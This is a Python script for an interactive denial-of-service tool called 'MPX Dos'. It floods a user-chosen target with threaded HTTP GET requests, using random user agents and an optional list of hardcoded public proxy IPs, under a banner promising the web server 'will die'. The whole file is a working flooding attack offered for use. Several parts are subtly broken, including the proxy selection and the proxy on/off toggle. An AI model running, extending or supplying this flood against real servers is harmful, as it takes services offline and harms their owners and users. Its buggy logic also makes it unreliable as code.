#========================================MODULES=================================
import requests
import random 
import click
from threading import Thread
from colorama import init, Fore, Style
from user import *


init(autoreset=True)
#==============================================VARS=======================================
proxyOpt = 0
target = ' '
ip_proxy=["152.67.70.31:80","152.67.64.111:80","68.183.58.213:80","152.67.72.89:80"]
headers = {
        'User-Agent' : random.choice(users)
}



#==============================================FUNC=======================================

def ddos_proxy(): 
 	global urlglob
 	urlglob = target 
 	proxy = random.randint(0, len(ip_proxy) - 1)
 	proxies = {"http": proxy}
 	requests.get(urlglob, proxies=proxies,headers=headers)

def ddos_defolt():
	global urlglob
	urlglob = target
	requests.get(urlglob,headers=headers)



def help():
	print(' ')
	print('======================================ATTACK=============================================')
	print('--run - launch an attack on a web-server')
	print('')
	print('======================================OPTIONS============================================')
	print('--set proxy True/False - use proxy or disable proxy(defolt:False)')
	print('--set target - set your target')
	print('--set colThreads - enter the number of threads.(defolt: 500)')
	print('')
	print('======================================PROXY==============================================')
	print('--addProxy - add proxy')
	print('--rmProxy - remove proxy')
	print('--readProxy - read the proxy list')
	print(' ')
	print('====================================ADDITIONAL===========================================')
	print('--clear - clear the console')
	print('--exit - exit from MPX Dos')
	print('')


s = requests.Session()

def colPac():
	global packets
	packets = int(input('Enter the number of threads>>>'))
	print(Fore.GREEN + '[+] ' + Fore.WHITE + 'The number of threads is set')

def run():
	if proxyOpt == 0:
		for i in range(packets):
			
			thr = Thread(target = ddos_defolt)
			thr.start()
			print(Fore.GREEN + '[+] ' + Fore.WHITE + 'DOS RUNNING..!')
	elif proxyOpt == 1:
		for i in range(packets):	
			thr = Thread(target = ddos_proxy)
			print(Fore.GREEN + '[+] ' +  Fore.WHITE + 'DOS RUNNING..!')
			thr.start()
			
def proxyTF():
	if vvod == '--set proxy True':
		proxyOpt = 1
		print(Fore.GREEN + '[+] ' + Fore.WHITE + 'Proxy On')

	elif vvod == '--set proxy False':
		proxyOpt = 0
		print(Fore.GREEN + '[+] ' + Fore.WHITE + 'Proxy Off')
def addProxy():
	print('Recommendation: you can take a proxy in https://hideme.name/en/proxy-list/')
	global addP
	addP = str(input('Enter proxy for add>>>'))
	ip_proxy.append(addP)
	print(Fore.GREEN + '[+]' + Fore.WHITE + 'Proxy added to the list')
def rmProxy():
	print(ip_proxy)
	global rmP 
	rmP = str(input('Enter proxy for remove>>>'))
	ip_proxy.remove(rmP)
	print(Fore.GREEN + '[+] ' + Fore.WHITE + 'Proxy removed to the list')
def readProxy():
	print(ip_proxy)






#===========================================MAIN===========================================================
def logick():
	click.clear()
	print(Fore.GREEN + '''

####Your web-server will die from.	╭━╮╭━┳━━━┳━╮╭━╮╭━━━╮
####Your web-server will die from 	┃┃╰╯┃┃╭━╮┣╮╰╯╭╯╰╮╭╮┃
####Your web-server will die from 	┃╭╮╭╮┃╰━╯┃╰╮╭╯╱╱┃┃┃┣━━┳━━╮
####Your web-server will die from 	┃┃┃┃┃┃╭━━╯╭╯╰╮╱╱┃┃┃┃╭╮┃━━┫
####Your web-server will die from 	┃┃┃┃┃┃┃╱╱╭╯╭╮╰╮╭╯╰╯┃╰╯┣━━┃
####Your web-server will die from.	╰╯╰╯╰┻╯╱╱╰━╯╰━╯╰━━━┻━━┻━━╯
				''' + Fore.RED + '     by Mega')

	print('')
	print("Enter '--help' to view the list of commands ")
	print('')

	while True:
		global vvod
		vvod = input("\033[4m{}".format('dos1') + '\033[0m{}'.format(">"))

		#===================================================================================================================================
		if vvod == '--help':
			help()
		elif vvod == '--run':
				
			run()
		elif vvod == '--set proxy True' or vvod == '-set proxy False':
				
			proxyTF()
		elif vvod == '--set target':
				
			global target
			target = str(input("Enter the target's IP address>>>"))
			print(Fore.GREEN + '[+] ' + Fore.WHITE + "The target's IP address is specified")

		elif vvod == '--set colThreads':
			colPac()
		elif vvod == '--addProxy':
			addProxy()
		elif vvod == '--rmProxy':
			rmProxy()
		elif vvod == '--readProxy':
			readProxy()
		elif vvod == '--clear':
			click.clear()
		elif vvod == '--exit':
			print(Fore.GREEN + 'Goodby:)')
			break

		else:
			print(Fore.RED + '[-]' + Fore.WHITE + ' There is no such command')







if __name__ == '__main__':
		logick()



